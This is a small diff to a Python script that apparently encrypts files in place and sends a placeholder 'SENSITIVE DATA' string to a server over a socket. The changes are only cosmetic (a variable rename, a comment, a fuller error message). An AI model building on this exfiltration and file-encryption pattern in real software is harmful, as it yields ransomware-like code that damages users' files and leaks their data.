@@ -26,8 +26,8 @@ try:
     s.connect(server_address)
 
     # Receive data from the server
-    data: bytes = s.recv(1024)
-    print(data.decode('utf-8'))  # Print the received message
+    __data: bytes = s.recv(1024)
+    print(__data.decode('utf-8'))  # Print the received message
 
     s.send("SENSITIVE DATA".encode('utf-8'))
 
@@ -69,12 +69,12 @@ finally:
                                 #print(x)
                             """
 
-                            f.seek(0)
+                            f.seek(0) # Gotta go back to the top before we write...
                             f.writelines(line + "\n" for line in __contents)
                     else:
                         print(colored(f"This file {e} is already encrypted!", color="red" ,attrs=["bold"]))
 
-    except IOError:
-        print("There was an IOError!")
+    except IOError as e:
+        print(f"There was an IOError! {e}")
 
 authentication["Hello World"] = 5
